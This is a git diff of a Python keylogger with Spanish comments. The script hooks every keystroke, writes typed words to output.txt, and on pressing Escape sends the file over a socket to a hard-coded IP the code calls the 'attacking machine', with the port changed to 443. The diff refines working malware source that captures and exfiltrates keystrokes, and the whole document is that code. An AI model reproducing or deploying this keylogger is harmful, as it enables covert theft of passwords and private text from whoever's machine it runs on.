@@ -25,25 +25,24 @@ reset = Style.RESET_ALL
 palabra = ""
 
 # Función para registrar cada palabra presionada en la variable palabra:
-def on_key_event(e):
+def pulsacion_tecla(pulsacion): # Recibir cada pulsación del teclado
 
     global palabra
 
-    if e.event_type == keyboard.KEY_DOWN:
+    if pulsacion.event_type == keyboard.KEY_DOWN:
     
-        if e.name == 'space':
-            guardar_palabra()
-        elif len(e.name) == 1 and e.name.isprintable():
-            palabra += e.name
+        if pulsacion.name == 'space':
+            guardar_palabra_al_espacio()
+        elif len(pulsacion.name) == 1 and pulsacion.name.isprintable(): # Se encarga de manejar las pulsaciones de teclas que representan caracteres imprimibles.
+            palabra += pulsacion.name
+
+# Registrar la función de devolución de llamada
+keyboard.hook(pulsacion_tecla) # Llamamos a la función on_key_event para pasarle cada pulsación a la variables pulsacion.
 
 # Cada palabra se guarda en el output.txt y se crea en caso de no existir.
-def guardar_palabra():
-    if not os.path.exists("output.txt"):
-        # Si el archivo no existe, se crea con permisos de escritura.
-        with open("output.txt", "w"):
-            pass
-
-    with open("output.txt", "a") as file:
+def guardar_palabra_al_espacio():
+    
+    with open("output.txt", "a") as file: # La a es de append, modo apertura del archivo para añadir información.
         file.write(palabra + "\n")
     print(f'Palabra registrada: {Fore.GREEN}{palabra}{Style.RESET_ALL}')
     resetear_palabra() # Llamamos a la función que se encarga de resetear la variable después de presionar espacio.
@@ -70,20 +69,18 @@ def enviar_archivo_via_sockets(archivo, direccion_ip, puerto):
 
 # Se detiene el script y ahí se llama a la función anterior.
 def detener_script():
-    print("Script detenido por el usuario.")
+    print("Enviamos datos a la máquina atacante")
     keyboard.unhook_all()  # Desvincular todos los eventos de teclado
     enviar_archivo_via_sockets(archivo_a_enviar, direccion_ip_destino, puerto_destino)
 
 # Donde enviamos el .txt
-direccion_ip_destino = '192.168.0.24'
-puerto_destino = 8080
+direccion_ip_destino = '192.168.0.37'
+puerto_destino = 443
 archivo_a_enviar = 'output.txt'
 
-# Registrar la función de devolución de llamada
-keyboard.hook(on_key_event)
-
 try:
-    keyboard.wait('esc')
-except KeyboardInterrupt:
-    # Manejar la excepción cuando se presiona Ctrl+C fuera del bucle
+    keyboard.wait('esc') # Bucle que debe estar en ejecución para detener el script con tecla escape.
     detener_script()
+except KeyboardInterrupt:
+    print(f'{Fore.GREEN}Script Detenido{Style.RESET_ALL}')
+    pass
